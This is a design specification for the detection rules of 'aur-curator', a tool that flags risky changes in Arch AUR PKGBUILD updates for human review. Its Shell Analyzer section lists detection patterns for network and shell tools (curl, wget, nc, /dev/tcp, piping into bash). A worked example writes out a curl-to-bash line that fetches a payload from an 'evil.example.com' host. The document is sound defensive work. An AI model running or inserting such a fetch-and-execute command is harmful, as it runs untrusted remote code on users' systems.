# Analyzer Detection Specs

> Last updated: 2026-11-07
> Status: Active
> Companion docs: `risk-analysis.md` (severity tiers), `domain.md`
> § Finding, `sprints/s05-analyzers-policy.md` § Category Taxonomy,
> `internal/git/types.go` (`GitDiff`/`FileDiff`, source of truth for the
> structs referenced throughout this doc)

## Contents

- [Purpose](#purpose)
- [Background](#background): what a PKGBUILD is, what the analyzers
  look at and why
- [Analyzers at a Glance](#analyzers-at-a-glance): each analyzer, what
  it reads, what it reports
- [Shared Conventions](#shared-conventions): input, Import, line
  classification, "new" entries, Finding fields
- [PKGBUILD Parsing](#pkgbuild-parsing): how arrays are read from a
  whole file
- Analyzers: [URL](#url-analyzer), [Checksum](#checksum-analyzer),
  [Shell](#shell-analyzer), [Depends](#depends-analyzer),
  [Pkgbuild](#pkgbuild-analyzer)
- [Known Limitations](#known-limitations)
- [Cross-References](#cross-references)

## Purpose

aur-curator's gate is a person reading the diff of every update before
it is merged (`workflow.md` § Review Decisions). The analyzers help
that person: they scan the change and point at the parts most likely to
matter (a new download location, a weakened checksum, new code that
runs at build or install time), ranked by severity
(`risk-analysis.md`). They
are pointers, not a verdict: a change with no findings still has to be
read, and the diff is the review.

`interfaces.md` § Analyzer says each analyzer "should examine one aspect
of a package" but not *how*. This doc is that specification, and an
explanation of the choices behind it, for the analyzers — URL, Checksum
and Shell (Sprint 5), Depends (#476) and Pkgbuild (#484) — so their
`Run` methods implement one shared, documented heuristic rather than
independently-invented ones.

## Background

### What a PKGBUILD is

A PKGBUILD is a bash script that `makepkg` sources to build a package.
Sourcing runs its top-level code; `makepkg` then calls its functions
(`prepare()`, `pkgver()`, `build()`, `check()`, `package()`, or
`package_<name>()` in a split package) as the user running the build.
Besides code, it declares what the build needs, as bash arrays:

| Array | Meaning | Why a change matters |
| --- | --- | --- |
| `source` (`source_x86_64`, …) | files to download, or to take from the package's own repository | a new URL is a new party trusted to supply code (`threat-model.md` S2) |
| `sha256sums`, `b2sums`, … | one checksum per `source` entry, same order; `SKIP` means "do not verify" | a hash replaced by `SKIP` lets the download change unnoticed (S3) |
| `validpgpkeys` | PGP keys whose signatures `makepkg` accepts for signed sources | a new key is a new signer trusted (S5) |
| `depends`, `makedepends`, `checkdepends`, `optdepends` | other packages needed to build or run | a new dependency is more code installed, possibly unreviewed (S7) |

A package may also ship a `.install` file: shell functions pacman runs
**as root** when the package is installed, upgraded or removed
(`threat-model.md` I1).

### Two ways of reading a change

Nothing here executes a PKGBUILD: running it is what the review is
meant to precede. The analyzers read text, in one of two ways, chosen
by what each looks for:

- **Added lines of the diff** — for code. A shell command is risky
  where it is new; lines already there were seen in an earlier review.
  So the Shell analyzer matches patterns in the lines the update adds,
  in the PKGBUILD and in `.install` files (#474).
- **Whole old and new file** — for arrays. An array's meaning is its
  set of entries, and a diff shows only the changed lines with three
  lines of context, so an array's entries can be spread over several
  hunks, or out of view entirely. The URL, Depends and PGP checks
  therefore parse the arrays of the whole PKGBUILD before and after the
  update and compare them (§ PKGBUILD Parsing, #484); so do the
  checksum and version checks (#485).

Either way, a part of the file the analyzers cannot read is reported as
a finding, never skipped silently (§ Pkgbuild Analyzer). False
positives and negatives are expected at the margins (§ Known
Limitations).

## Analyzers at a Glance

| Analyzer | Looks for | Reads | Categories (severity) |
| --- | --- | --- | --- |
| URL | new download locations in `source` arrays | whole old and new PKGBUILD | `url_new` (High) |
| Checksum | weakened verification, new signing keys, version changes | whole old and new PKGBUILD | `pgp_removed` (High), `checksum_removed` (High), `pgp_key_changed` (Medium), `checksum_refresh` (Low), `version_bump` (Low) |
| Shell | code that runs other code or uses the network; `.install` scriptlets added or changed | added lines of the PKGBUILD and `.install` diffs; `.install` file headers | `shell_exec` (High), `network_download` (High), `install_changed` (Medium) |
| Depends | dependencies added | whole old and new PKGBUILD | `depends_added` (Medium) |
| Pkgbuild | arrays the parser could not read | whole new PKGBUILD | `array_unreadable` (High) |

Severities are defaults from `risk-analysis.md` § Categories. Each
analyzer's section below gives its exact rules.

**Implementation note:** whole-file array parsing is
`internal/analyzer/pkgbuildfile.go` (`parsePKGBUILDFile`); the diff
reading used by Shell is `internal/analyzer/pkgbuild.go`
(`splitPatchLines`). Each is tested directly, table-driven, so its
behaviour is not re-verified through each analyzer's tests.

---

## Shared Conventions

### Input shape

Every analyzer receives `*git.GitDiff` (`internal/git/types.go`):

```go
type GitDiff struct {
    LocalCommit    string // always empty from ReviewDiff
    BaseCommit     string // "" on a first review (Import)
    UpstreamCommit string
    Commits        []Commit
    Files          []FileDiff
}

type FileDiff struct {
    Path  string
    Kind  FileKind
    Patch string // unified diff text for this one file
    // Whole text at the base and upstream commits; "" where the file
    // does not exist. Filled by ReviewDiff for FileKindPKGBUILD only,
    // and ContentLoaded says so (#484).
    Old, New      string
    ContentLoaded bool
}
```

An analyzer that reads `Old`/`New` and is given a PKGBUILD `FileDiff`
with `ContentLoaded == false` returns an error: a caller bug, reported
like any analyzer failure (#410), never an empty result.

Each analyzer selects the `FileDiff` it cares about from `diff.Files` by
`Kind` (never by matching `Path` against a literal filename string — Kind
is the authoritative classification per `types.go`'s own doc comment).
If no `FileDiff` of the required `Kind` is present, the analyzer returns
`(nil, nil)` — no findings, not an error; a package with no `.install`
file, for example, is not a Checksum-analyzer failure.

### Import case

When `diff.BaseCommit == ""` (first-time review, `workflow.md` § Import),
every `FileDiff.Patch` is fully additive — every content line is an Added
line, there are no Removed lines — and every `Old` is empty. No analyzer
needs a special code path for this: comparing with nothing already
produces the right result, since "new URL" / "new shell invocation" naturally
means "every URL / shell invocation in the file," which is correct for a
first review (nothing has been vetted yet). The same holds for the #476
categories: on Import every dependency is named in `depends_added`,
every key in `pgp_key_changed` (`PGP key added`), and a `.install` file
is reported as added.

### Line classification

Given a `FileDiff.Patch` (standard unified diff, as produced by
`git diff`), classify each line before scanning content:

| Line prefix | Classification | Handling |
| --- | --- | --- |
| `@@` | Hunk header | Skip; optionally parse `@@ -a,b +c,d @@` to track the new-file line number for `Finding.Location` |
| `+++` or `---` | File header | Skip |
| `+` (not `+++`) | Added | Strip the leading `+`; this is new content |
| `-` (not `---`) | Removed | Strip the leading `-`; this is prior content |
| anything else | Context | Unchanged line; ignored — analyzers only act on what changed |

### "New" for array entries

An array entry is **new** when the old file has no equal entry (URLs:
no equal URL in any `source` array, any arch; dependencies: no entry of
the same package name in the same array; keys: no equal key in the same
array). Moving, reordering or reformatting entries is therefore never a
finding. The positional checksum comparison (§ Checksum Analyzer) is
deliberately position-aware instead, and the Shell analyzer flags every
Added line: a shell line moved elsewhere (from `package()` to the top
level, say) runs at a different time, so moved shell code is flagged
again (#474).

### Finding fields

All analyzers populate `domain.Finding` the same way:

- `Analyzer` — the producing analyzer's `Name()` (`"url"`, `"checksum"`,
  `"shell"`, `"depends"`).
- `Category` — one of the exported constants in
  `internal/analyzer/categories.go`, listed in `analyzer.Categories`;
  never a string literal (enforced by tests, `risk-analysis.md`
  § Unmapped categories).
- `Summary` — one short human-readable line, e.g. `"New source URL:
  https://example.com/pkg-2.0.tar.gz"`.
- `Location` — `"<Path>:<line>"`, built by the shared `location(path
  string, line int) string` helper in `pkgbuild.go`. `line` comes from
  whichever construct the Finding is about:
  - **Array-derived findings** (`url_new`, `pgp_removed`,
    `pgp_key_changed`, `depends_added`, `array_unreadable`,
    `checksum_removed`, `checksum_refresh`): the new-file line of the
    entry involved (the new URL, the SKIP substitution), or of the
    array's opening line when no single entry is "the" location — e.g.
    `pgp_removed`, which is about an absence, not a specific entry.
  - **Scalar-derived findings** (`version_bump`): the new-file line of
    the scalar's last assignment.
  - **Line-derived findings** (`shell_exec`, `network_download`): the
    `patchLine.newLineNo` of the matching Added line, in the PKGBUILD and
    in `.install` alike — both are scanned line by line, not parsed.

  `line <= 0` means no new-file line number exists for that content —
  e.g. an array wholly deleted with nothing replacing it doesn't exist
  in the file being reviewed at all. `location()` degrades to the bare
  `Path` in that case rather than emitting a misleading `:0`.
- `Details` — left `nil`/empty for all analyzers; no
  analyzer currently has evidence detailed enough to warrant it.

Lines always point into the new file: content only in the old file has
nothing to point at in the file being reviewed.

---

## PKGBUILD Parsing

`parsePKGBUILDFile` reads one whole PKGBUILD (`FileDiff.Old` or
`.New`) as text. It is not a bash interpreter: it reads array
assignments as written (#484).

1. **Assignments read.** A line whose first word, after leading
   whitespace, is `NAME=(` or `NAME+=(`, where `NAME` is `source`,
   `validpgpkeys`, `depends`, `makedepends`, `checkdepends`,
   `optdepends` or a checksum array (`(md5|sha1|sha224|sha256|sha384|
   sha512|b2|ck)sums`), each with an optional arch suffix
   (`depends_x86_64`). Anywhere in the file: top level, inside
   `package_*()`, inside `if`. Other arrays are not read.
2. **Every assignment counts.** All assignments of a label (name and
   arch) are kept, in file order: `depends=(…)` in two `package_*()`
   functions, `source+=(…)` in an `if`. bash would run one; the parser
   cannot know which, so it keeps all. This errs towards more findings,
   never fewer.
3. **Entries are bash words** up to the unquoted `)`: unquoted text,
   `'…'`, `"…"` (inside which a backslash escapes `$`, `` ` ``, `"`,
   `\` and newline), backslash escapes outside quotes, `\`-newline
   continuation, and `${…}`, `$(…)` and `` `…` `` kept as raw text
   (balanced and quote-aware, so a `)` inside them does not end the
   array). A `#` at the start of a word begins a comment to the end of
   the line. Adjacent segments make one word
   (`"$pkg.tar.gz"::"https://…"`). An entry's value is the word with
   its quotes removed and expansions left as written; its line is the
   line the word starts on.
4. **Nothing is expanded:** variables, brace expansion
   (`qt5-{base,svg}` is one entry, as written) and `$(…)` are compared
   as text (§ Known Limitations).
5. **Unreadable arrays.** An array of these names that has no unquoted
   closing `)` (end of file, an unterminated quote or expansion), or
   that contains `(`, `;`, `&`, `|`, `<` or `>` outside quotes and
   expansions, is recorded as unreadable with its first and last line,
   and none of its entries are used. In the new file it is an
   `array_unreadable` finding (§ Pkgbuild Analyzer); in the old file it
   counts as absent, so every entry of the new array is new.
6. **Indexed assignments** `NAME[N]=WORD` to these arrays, `N` a
   literal non-negative integer, where a command can start (as in rule
   1), and `NAME=WORD` without parentheses (bash's `NAME[0]=WORD`), add
   `WORD` as one more value position `N` may hold. The entry already at
   `N` is kept: the assignment may be in a branch that does not run, as
   in a real PKGBUILD's `if (( _manual_clone )); then source[0]=…;
   sha256sums[0]=…; fi`, and replacing would hide the URL and checksum
   it overrides (rule 2; #485). Any index works, sparse ones included
   (`depends[125]=…`). The URL, Depends and PGP checks take every value
   of an array; the checksum checks compare position by position
   (§ checksum_removed). A non-literal index (`[$i]`, `[-1]`),
   `NAME+=WORD` without parentheses (bash appends to element 0's text)
   and `NAME[N]=(…)` make that assignment unreadable (rule 5).
7. **Scalars** `pkgver` and `pkgrel` are read the same way: the last
   assignment `NAME=WORD` where a command can start, the word as in rule
   3 (§ version_bump).

---

## URL Analyzer

**Target:** the `FileDiff` with `Kind == FileKindPKGBUILD`. Nothing else.

**Category produced:** `url_new` only.

### Algorithm

1. Parse the old and new PKGBUILD (§ PKGBUILD Parsing) and take every
   `source` array, any arch suffix (`source`, `source_x86_64`, …).
2. From each entry, extract URL-like tokens matching:

   ```text
   [A-Za-z][A-Za-z0-9+.-]*://[^\s"')]+
   ```

   (covers `http://`, `https://`, `ftp://`, `git://`, `git+https://`,
   etc., including after a `name::` prefix.)
3. A URL in the new file is new if no `source` entry of the old file,
   any arch, has it (§ Shared Conventions, "New" for array entries). A
   URL that moved, between positions or between arch arrays, is not
   new.
4. Emit one `Finding{Category: "url_new"}` per new URL, once, at the
   line of the first entry that has it.

### Worked example

```diff
-source=("https://example.org/pkg-1.9.tar.gz")
+source=("https://example.org/pkg-2.0.tar.gz")
```

→ one Finding: `url_new`, `"New source URL:
https://example.org/pkg-2.0.tar.gz"`. (The old URL is gone from the new
file; only URLs of the new file are candidates.)

```diff
-source=("https://a.example.com/x.tar.gz"
-        "https://b.example.com/y.tar.gz")
+source=("https://b.example.com/y.tar.gz"
+        "https://a.example.com/x.tar.gz")
```

→ zero Findings. Both URLs are in the old file — this is a reorder, not
a new source.

---

## Checksum Analyzer

**Target:** the same `FileDiff` (`Kind == FileKindPKGBUILD`).

**Categories produced:** `pgp_removed`, `pgp_key_changed`,
`checksum_removed`, `checksum_refresh`, `version_bump`. The PGP and
checksum categories give at most one Finding per array; `version_bump`
at most one per review. All read the whole old and new PKGBUILD (#484,
#485).

### pgp_removed

Both PGP checks compare each `validpgpkeys` label (name and arch) of
the old and new file (§ PKGBUILD Parsing), all its assignments
together. A key-looking entry matches `^[0-9A-Fa-f]{8,}$` (a key ID or
fingerprint).

1. If the old array has a key-looking entry and the new one has none
   (array deleted, emptied, or keys replaced by something else), emit
   `Finding{Category: "pgp_removed"}`, at the new array's opening line,
   or without a line when it is gone. Not when the new file has an
   unreadable assignment of that label: the keys may still be there,
   and `array_unreadable` already reports it (§ Pkgbuild Analyzer).
2. If the new array still has a key-looking entry, do not emit: that is
   a key change, § pgp_key_changed.

### pgp_key_changed

Per `validpgpkeys` label for which `pgp_removed` did not fire (#476):

1. The new keys are the key-looking entries of the new array that the
   old array does not have.
2. If there are any, emit one `Finding{Category: "pgp_key_changed"}`:
   Summary `PGP key replaced: <keys>` when a key-looking entry was also
   removed, `PGP key added: <keys>` otherwise, keys comma-separated;
   Location the first new key's line.
3. A new trusted key is a change in who the package trusts, with or
   without a removal: Medium. On Import every key is new, so the
   Finding lists them (`PGP key added`).

### checksum_removed / checksum_refresh

Per checksum label (name and arch: `sha256sums`, `b2sums_x86_64`, …,
any of `(md5|sha1|sha224|sha256|sha384|sha512|b2|ck)sums`) that the old
**and** the new PKGBUILD have (§ PKGBUILD Parsing), all assignments of
the label together, including indexed ones (#485):

1. Compare **by position** (old position 0 with new position 0, and so
   on). Checksum arrays are coupled to the `source` arrays by position,
   so reordering changes meaning and no "new entry" check applies here.
   A position holds its entry and any indexed values for it (§ PKGBUILD
   Parsing rule 6), so it may hold more than one value.
2. If at some position the old array has a hash (matches
   `^[0-9a-fA-F]{32,128}$`, md5 through sha512/b2 lengths) and the new
   array has a value that is not a hash — `SKIP`, empty, `$(…)` or
   anything else — and that the old array did not have at that position,
   emit one `Finding{Category: "checksum_removed"}` for the array, at
   that value's line. One per array, not per entry: three sources losing
   verification in one commit is one incident. The trigger is "no
   longer hash-shaped", not "equals `SKIP`". An override already present
   in the old file (`sha512sums[4]='SKIP'` in both) is not a removal; a
   new one is. Not when the new file has an unreadable assignment of the
   label: the hash may still be there, and `array_unreadable` reports
   it.
3. Otherwise, if any position's values differ, or the number of
   positions, emit one `Finding{Category: "checksum_refresh"}`, at the
   first differing new value, or at the array's opening line when there
   is none (an entry went away).
4. An unchanged array produces nothing.
5. **A label only in the new file** (Import, a new arch) produces
   nothing: nothing was weakened, and its sources are `url_new`. **A
   label only in the old file** (array deleted) produces nothing either:
   makepkg refuses to build a source array that no checksum array
   verifies ("Integrity checks are missing for: …",
   `libmakepkg/integrity/verify_checksum.sh` `check_checksums`), and
   deletions are normal when an arch is dropped or the algorithm is
   switched (§ Known Limitations: a downgrade to a weaker remaining
   algorithm).

### version_bump

1. Read `pkgver` and `pkgrel` from each whole file: the last assignment
   `pkgver=` / `pkgrel=` at the start of a command (any indentation,
   § PKGBUILD Parsing), its value a bash word with quotes removed and
   expansions left as written (`pkgver='1.2'` → `1.2`;
   `pkgver=${_ver/-/.}` stays as written). A trailing comment is dropped:
   a `#` preceded by whitespace and outside quotes (`pkgver=1.2.3  #
   note` → `1.2.3`); a `#` inside a word or quotes is part of the value
   (`pkgver=1.2#3`, `pkgver='1.2 # x'`). An assignment whose value is
   only a comment (`pkgrel= # set below`) has no value (#24).
2. If both files have a `pkgver` and it differs, capture the pair, e.g.
   `12.4 → 12.5`; the same for `pkgrel`.
3. Emit **one** `Finding{Category: "version_bump"}` for the review if
   either changed, with `Summary` combining whichever changed, e.g.
   `"pkgver: 12.4 → 12.5"` or `"pkgver: 12.4 → 12.5, pkgrel: 1 → 2"`,
   at `pkgver`'s line if it changed, else `pkgrel`'s. On Import there is
   no old file, so no finding. `epoch` is not compared.

### Worked example

```diff
-sha256sums=('a1b2c3...64hexchars...')
+sha256sums=('SKIP')
-pkgver=12.4
+pkgver=12.5
```

→ two Findings: `checksum_removed` (the array went from a real hash to
a non-hash-shaped value — here, `SKIP`) and `version_bump`
(`"pkgver: 12.4 → 12.5"`). Not `checksum_refresh` — step 3's
not-hash-shaped check takes priority over step 4's generic-change check
for the same array. An empty string (`''`) or any other non-hash value
in place of `SKIP` triggers the same `checksum_removed` classification.

```diff
-sha256sums=('a1b2...oldhash')
+sha256sums=('f9e8...newhash')
-pkgver=12.4
+pkgver=12.5
```

→ two Findings: `checksum_refresh` (real hash replaced by a different
real hash — normal version-bump housekeeping) and `version_bump`.

---

## Shell Analyzer

**Targets:** every Added line of two files within the diff:

1. The `FileDiff` with `Kind == FileKindPKGBUILD`. All of it is shell
   that runs: top-level code when `makepkg` sources the PKGBUILD, and
   every function (`prepare()`, `pkgver()`, `build()`, `check()`,
   `package()`, `package_<name>()`, helpers) at build time. Before #474
   only Added lines inside `build()`, `package()` and `prepare()` were
   scanned, and only when the function's header line was visible in the
   diff.
2. Every `FileDiff` with `Kind == FileKindInstall`: a split package can
   have several (before #476 only the last one was scanned).

**Categories produced:** `shell_exec`, `network_download`,
`install_changed`. The first two may both be emitted for the same line if
it matches both pattern sets (e.g. `curl ... | bash` is simultaneously a
download and a dynamic-code execution — see worked example).

### Scope

Only Added lines are scan candidates. Context and Removed lines are not
analyzed: an analyzer flags *new* risk, not pre-existing risk the
reviewer already accepted in a prior approved review. Nothing is
extracted or skipped by position: there is no function-body parsing.

Every line finding's `Summary` is `<label>: <line>`, where the label is
`Network download` or `Dynamic shell execution`; `Location` says which
file and line.

### install_changed

`.install` scriptlets run as root at install time (`threat-model.md` I1),
so adding or changing one is a Medium finding of its own, whether or not
any line matches a pattern set (#476):

1. One `Finding{Category: "install_changed"}` per `FileKindInstall` file
   in the diff, unless the file is deleted: a removed scriptlet runs
   nothing.
2. Added or changed is read from git's header lines in `Patch`: `new file
   mode` or `--- /dev/null` means added; `deleted file mode` or `+++
   /dev/null` means deleted; anything else is changed.
3. Summary `.install added: <path>` or `.install changed: <path>`;
   Location `<path>:<line>` of the first Added line, or `<path>` if there
   is none (a mode-only change).
4. On Import every file is new: `.install added`.

### Pattern sets

`network_download` — an Added line (PKGBUILD or `.install`) matching any
of:

```text
\bcurl\b
\bwget\b
\bgit\s+clone\b
\bnc\s+-
/dev/tcp/
```

`shell_exec` — an Added line (same scope) matching any of:

```text
\beval\b
\bbash\s+-c\b
\bsh\s+-c\b
^\s*source\s+\S+   # sourcing another script into the current shell
^\s*\.\s+\S+        # POSIX dot-sourcing, same as `source`
`[^`]+`            # backtick command substitution
\$\([^)]*\)        # $() command substitution
\|\s*(bash|sh)\b   # piping into a shell
base64\s+-d.*\|\s*(bash|sh)
```

The `$()`/backtick patterns are intentionally broad and will over-flag
common, benign PKGBUILD idioms (`$(uname -m)`, `$(basename "$srcdir")`).
This is a known, accepted false-positive source for Sprint 5 — see
§ Known Limitations — rather than an attempt at a real allowlist, which
would need a maintained list of "safe" command substitutions that's out
of scope for a first pass.

The `source`/dot-sourcing patterns carry an even higher false-positive
rate than `$()` in practice: sourcing a local helper script (e.g.
`source helper.sh` in `prepare()`) is one of the most common legitimate
PKGBUILD idioms, not a rare or suspicious one. It's still included
because sourcing pulls another file's contents into the current shell
for execution — a real risk vector, and one where the sourced file, if
new or changed, is independently visible in the Diff tab (as an "Other"
`FileKind`) for the reviewer to check. `source=(...)` (the PKGBUILD
array declaration, not the shell built-in) is not matched by this
pattern — the regex requires whitespace immediately after `source`,
which `source=(` never has.

### Worked example

```diff
 package() {
+  curl -s https://evil.example.com/payload.sh | bash
   install -Dm755 "$pkgname" "$pkgdir/usr/bin/$pkgname"
 }
```

→ two Findings on the same line: `network_download` (the `curl` match)
and `shell_exec` (the `| bash` match). Both are real risk signals and
both should surface — a reviewer benefits from seeing "this both fetches
something and immediately executes it" as two distinct flagged aspects,
not one collapsed Finding.

```diff
 build() {
-  make
+  make PREFIX="$(pkg-config --variable=prefix somepkg)"
 }
```

→ one Finding: `shell_exec`, from the `$()` pattern — a false positive
by any reasonable human judgment (this is ordinary `pkg-config` usage),
but consistent with the accepted heuristic tradeoff above.

---

## Depends Analyzer

**Target:** the `FileDiff` with `Kind == FileKindPKGBUILD`.

**Category produced:** `depends_added`, at most one Finding per array
name and arch suffix (#476). All assignments of a label count together
(§ PKGBUILD Parsing), including the same array in several
`package_*()` functions of a split package.

1. Look at every array named `depends`, `makedepends`, `checkdepends` or
   `optdepends`, with or without an arch suffix (`depends_x86_64`), in
   the old and new file (#484).
2. An entry's package name is the entry up to the first `:` (the
   optdepends description) or version operator (`<`, `>`, `=`), as
   written: `qt5-{base,svg}` is one name, braces and all.
3. The added entries are those of the new array whose package name is
   not the name of any entry of the old array with the same label. So a
   version change (`foo>=1.2` to `foo>=1.3`) or a new optdepends
   description is not an added dependency; a removed dependency is not
   flagged; `qt5-{base,svg}` → `qt5-{base,svg,evil}` is (the word
   changed).
4. If there are any, emit one `Finding{Category: "depends_added"}`:
   Summary `Dependencies added (<array>): <entries>`, the array with its
   arch suffix and the entries as written (`foo>=1.2`), comma-separated;
   `optdepends` entries by package name only, since their descriptions
   are long and the diff has them. Location the first added entry's
   line.
5. On Import every entry is added, so each array's Finding names all its
   dependencies.

A new dependency is a change in what the package trusts: Medium. An AUR
dependency is installed by the user, unreviewed unless it is curated too
(`threat-model.md` S7).

---

## Pkgbuild Analyzer

**Target:** the `FileDiff` with `Kind == FileKindPKGBUILD`, its `New`
text.

**Category produced:** `array_unreadable` (High, #484).

For each array assignment of the new file that § PKGBUILD Parsing could
not read, one Finding: Summary `<array>: could not read lines
<first>–<last>; findings for it may be missing. Check the diff.`
(`line <n>` when it is one line); Location the first line. The summary
does not name the checks that read the array: a list kept in a message
would drift from the checks.

If the PKGBUILD `FileDiff` has `ContentLoaded == false`, the analyzer
returns an error (§ Input shape).

High, like an unmapped category (`risk-analysis.md` § Unmapped
categories): a part of the file no check could read must not look like
a part with nothing to report. An unreadable array of the old file
gives no finding; its new entries all count as new instead.

---

## Known Limitations

Tracked here rather than silently worked around, per the project's
stated preference for flagged assumptions over silent scope creep:

- **PKGBUILDs are read, not run.** Arrays are compared as written.
  Variables are not expanded: a `source` entry written as
  `${url}/x.tar.gz` keeps its text when `url=` changes, so there is no
  `url_new` (the `url=` line is in the diff). Brace expansion is not
  expanded either: `qt5-{base,svg}` is one entry. Arrays filled at build
  time (`sha256sums=("$(…)")`) are seen as the text written; the Shell
  analyzer flags the `$()` (#487).
- **Every assignment counts.** Assignments in different branches of an
  `if`, or in different `package_*()` functions, are all taken as the
  array's entries. This errs towards more findings.
- **Heredocs and multi-line strings** are not tracked: a line inside one
  that starts like an array assignment is read as one. Rare; it errs
  towards more findings.
- **`$()`/backtick detection is intentionally broad** and will flag
  common benign PKGBUILD idioms as `shell_exec`. No allowlist exists yet.
  A future refinement pass could maintain one (e.g. `pkg-config`,
  `uname`, `basename`, `dirname` as known-safe command substitutions),
  but that's explicitly deferred, not attempted here. A `$(` whose `)`
  is on a later line is not matched.
- **`source`/dot-sourcing detection has an even higher false-positive
  rate** than `$()` — sourcing a local helper script is routine, not
  suspicious, in real PKGBUILDs. Included anyway because the sourced
  file's own diff is independently reviewable (as an "Other" `FileKind`
  in the Diff tab), so the Finding is a nudge to go check that file, not
  a claim that sourcing itself is wrong. Same "no allowlist yet"
  tradeoff as `$()` applies here.
- **Checksums are compared by index.** When sources are added or
  removed, entries at the same index can belong to different sources,
  so a refresh can read as a removal or the other way round.
- **A deleted checksum array is not a finding** (§ checksum_removed rule
  5). If another, weaker algorithm's array remains (`sha256sums` deleted,
  `md5sums` kept), makepkg verifies with that one only; the diff shows
  the deletion, no finding does.

None of these weakens the review gate: the full diff is always shown.
They weaken the pointers into it (`threat-model.md` § Analyzer gaps).

---

## Cross-References

- Category → Severity mapping is defined in `risk-analysis.md`,
  which is the canonical source for severity classification.
  This document specifies only analyzer detection behavior.
- `Finding` struct shape: `domain.md` § Finding.
- `GitDiff`/`FileDiff`/`FileKind`: `internal/git/types.go` (source of
  truth — if that file changes, this doc's field references need to be
  re-verified, not assumed still accurate).
